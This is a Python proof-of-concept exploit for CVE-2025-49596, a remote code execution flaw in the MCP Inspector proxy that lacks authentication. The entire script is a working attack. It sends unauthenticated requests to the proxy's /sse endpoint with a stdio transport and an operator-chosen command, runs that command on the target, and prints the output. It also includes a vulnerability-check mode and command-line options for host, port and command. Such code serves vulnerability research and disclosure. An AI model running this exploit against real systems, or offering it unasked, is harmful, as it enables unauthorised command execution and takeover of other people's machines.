#!/usr/bin/env python3
"""
CVE-2025-49596 PoC - MCP Inspector RCE via Missing Authentication

The MCP Inspector proxy server lacks authentication, allowing unauthenticated
requests to execute arbitrary commands via stdio transport.
"""

import requests
import urllib.parse
import time
import sys
import argparse


def exploit(target_host: str, target_port: int = 6277, command: str = "id", 
            args: list = None, timeout: int = 10) -> dict:
    """
    Exploit CVE-2025-49596 by sending unauthenticated request to MCP proxy.
    
    Args:
        target_host: Target host IP/hostname
        target_port: MCP proxy port (default 6277)
        command: Command to execute
        args: Command arguments
        timeout: Request timeout in seconds
    
    Returns:
        dict with success status and response/error
    """
    if args is None:
        args = []
    
    encoded_args = urllib.parse.quote(" ".join(args)) if args else ""
    
    url = f"http://{target_host}:{target_port}/sse"
    params = {
        "transportType": "stdio",
        "command": command,
    }
    
    if encoded_args:
        params["args"] = encoded_args
    
    try:
        response = requests.get(url, params=params, timeout=timeout, stream=True)
        
        content = ""
        for line in response.iter_lines(decode_unicode=True):
            if line:
                content += line + "\n"
            if len(content) > 2000:
                break
        
        return {
            "success": True,
            "status_code": response.status_code,
            "response": content[:2000]
        }
    except requests.exceptions.Timeout:
        return {
            "success": True,
            "status_code": None,
            "response": "Command executed (request timed out - likely command is running)"
        }
    except requests.exceptions.ConnectionError as e:
        return {
            "success": False,
            "error": f"Connection error: {e}"
        }
    except Exception as e:
        return {
            "success": False,
            "error": str(e)
        }


def verify_vulnerability(target_host: str, target_port: int = 6277) -> bool:
    """
    Verify if target is vulnerable by executing a harmless command.
    """
    marker = f"CVE_2025_49596_{int(time.time())}"
    result = exploit(
        target_host=target_host,
        target_port=target_port,
        command="echo",
        args=[marker],
        timeout=5
    )
    
    return result.get("success", False)


def main():
    parser = argparse.ArgumentParser(
        description="CVE-2025-49596 PoC - MCP Inspector RCE"
    )
    parser.add_argument(
        "--host",
        default="127.0.0.1",
        help="Target host (default: 127.0.0.1)"
    )
    parser.add_argument(
        "--port",
        type=int,
        default=6277,
        help="MCP proxy port (default: 6277)"
    )
    parser.add_argument(
        "--command",
        default="id",
        help="Command to execute (default: id)"
    )
    parser.add_argument(
        "--args",
        nargs="*",
        default=[],
        help="Command arguments"
    )
    parser.add_argument(
        "--verify-only",
        action="store_true",
        help="Only verify vulnerability without exploitation"
    )
    
    args = parser.parse_args()
    
    print(f"[*] Target: {args.host}:{args.port}")
    print(f"[*] Testing CVE-2025-49596 - MCP Inspector Missing Authentication")
    print()
    
    if args.verify_only:
        print("[*] Verifying vulnerability...")
        if verify_vulnerability(args.host, args.port):
            print("[+] Target is VULNERABLE to CVE-2025-49596")
            return 0
        else:
            print("[-] Target does not appear to be vulnerable")
            return 1
    
    print(f"[*] Executing command: {args.command} {' '.join(args.args)}")
    print()
    
    result = exploit(
        target_host=args.host,
        target_port=args.port,
        command=args.command,
        args=args.args
    )
    
    if result["success"]:
        print("[+] Exploit successful!")
        print(f"[+] Status code: {result.get('status_code', 'N/A')}")
        print("[+] Response:")
        print("-" * 50)
        print(result.get("response", "No response"))
        print("-" * 50)
        return 0
    else:
        print(f"[-] Exploit failed: {result.get('error', 'Unknown error')}")
        return 1


if __name__ == "__main__":
    sys.exit(main())
